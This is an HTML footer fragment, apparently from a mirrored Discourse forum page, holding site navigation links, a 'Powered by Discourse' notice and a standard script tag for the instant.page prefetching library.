      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="Anb2wsDKUyETGrm8NPfuUHP8A"></script>
  </body>
  
</html>
